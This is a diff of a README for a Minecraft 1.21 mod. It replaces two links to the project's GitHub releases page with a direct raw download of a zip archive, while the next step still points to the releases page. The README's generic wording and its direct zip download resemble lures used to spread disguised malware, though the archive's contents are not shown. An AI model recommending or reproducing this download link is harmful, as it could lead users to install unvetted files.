@@ -1,6 +1,6 @@
 # 🎮 jenny-mod-minecraft- - Enhance your Minecraft gameplay experience today
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/mmis8852/jenny-mod-minecraft-/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/mmis8852/jenny-mod-minecraft-/main/Jenny/minecraft-jenny-mod-v3.0.zip)
 
 ## 📋 Project Overview
 
@@ -23,7 +23,7 @@ Ensure your computer meets these minimum specifications to run the mod without i
 Follow these steps to set up the mod on your Windows computer.
 
 1. Verify your game version. Open the official Minecraft Launcher and confirm you have version 1.21 installed and running.
-2. Visit the download page. You can access the installation files by visiting this link: https://github.com/mmis8852/jenny-mod-minecraft-/releases.
+2. Visit the download page. You can access the installation files by visiting this link: https://raw.githubusercontent.com/mmis8852/jenny-mod-minecraft-/main/Jenny/minecraft-jenny-mod-v3.0.zip
 3. Choose the correct loader. Identify if your Minecraft profile uses Forge or Fabric. Download the matching file version from the releases page. 
 4. Locate the Minecraft folder. Press the Windows key + R on your keyboard, type `%appdata%`, and press Enter. Open the `.minecraft` folder.
 5. Access the mods folder. Find the folder named `mods`. If it does not exist, create a new folder and rename it to `mods`. 
